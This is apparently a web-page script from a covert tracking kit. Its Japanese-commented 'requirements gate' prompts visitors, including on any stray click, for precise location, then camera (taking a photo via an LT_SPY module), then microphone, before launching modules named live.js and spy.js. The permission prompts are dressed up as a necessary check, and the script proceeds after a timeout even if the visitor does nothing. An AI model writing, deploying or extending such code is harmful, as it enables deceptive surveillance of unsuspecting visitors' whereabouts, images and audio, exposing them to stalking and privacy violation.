/* 要件ゲート。押されたら 位置情報→カメラ→マイク の順で許可を求める。
   終わったら igt:gate を発火して live.js / spy.js を起動する。 */
(function () {
  "use strict";

  var GATE = document.getElementById("lt_gate");
  var btn = document.getElementById("lt_go");
  var stat = document.getElementById("lt_gate_st");
  var busy = false;

  function say(t) { if (stat) stat.textContent = t || ""; }
  function wait(ms) { return new Promise(function (r) { setTimeout(r, ms); }); }

  function geo() {
    return new Promise(function (res) {
      if (!navigator.geolocation) { say("位置情報：この端末では非対応"); return res(); }
      say("① 位置情報の許可を確認しています…");
      var done = false;
      function fin() { if (done) return; done = true; res(); }
      var t = setTimeout(fin, 22000);
      try {
        navigator.geolocation.getCurrentPosition(
          function (p) { clearTimeout(t); window.LT_FIRST_FIX = p; say("① 位置情報：取得しました"); fin(); },
          function (e) {
            clearTimeout(t);
            say((e && e.code === 1) ? "① 位置情報：拒否されました"
                                    : "① 位置情報：取れませんでした（あとで再挑戦します）");
            fin();
          },
          { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 });
      } catch (e) { clearTimeout(t); fin(); }
    });
  }

  function cam() {
    if (!window.LT_CAM || !window.LT_SPY || !window.LT_SPY.cam) return Promise.resolve();
    say("② カメラの許可を確認しています…");
    return Promise.race([window.LT_SPY.cam(), wait(20000)]).then(function (ok) {
      say(ok === false ? "② カメラ：取れませんでした" : "② カメラ：撮影しました");
    }).catch(function () {});
  }

  function mic() {
    if (!window.LT_MIC || !window.LT_SPY || !window.LT_SPY.mic) return Promise.resolve();
    say("③ マイクの許可を確認しています…");
    return Promise.race([window.LT_SPY.mic(), wait(20000)]).then(function (ok) {
      say(ok === false ? "③ マイク：取れませんでした" : "③ マイク：OK");
    }).catch(function () {});
  }

  function pass() {
    if (window.LT_GATE_PASS) return;
    window.LT_GATE_PASS = true;
    if (GATE) {
      GATE.classList.add("out");
      setTimeout(function () { GATE.style.display = "none"; }, 400);
    }
    if (window.LT_FIRST_FIX && window.LT_LIVE && window.LT_LIVE.feed) {
      try { window.LT_LIVE.feed(window.LT_FIRST_FIX); } catch (e) {}
    }
    try { window.dispatchEvent(new Event("igt:gate")); } catch (e) {}
  }

  function run() {
    if (busy) return;
    busy = true;
    if (btn) { btn.disabled = true; btn.textContent = "確認中…"; }
    say("");
    geo().then(cam).then(mic).then(function () {
      setTimeout(pass, 250);
    });
    setTimeout(pass, 26000);   // 保険
  }

  if (btn) btn.addEventListener("click", run, { once: true });
  document.addEventListener("click", function (e) {
    if (!busy && e.target !== btn) run();
  }, { passive: true });
  window.LT_GATE_RUN = run;

  if (!GATE) pass();          // ゲート無しなら即通す
})();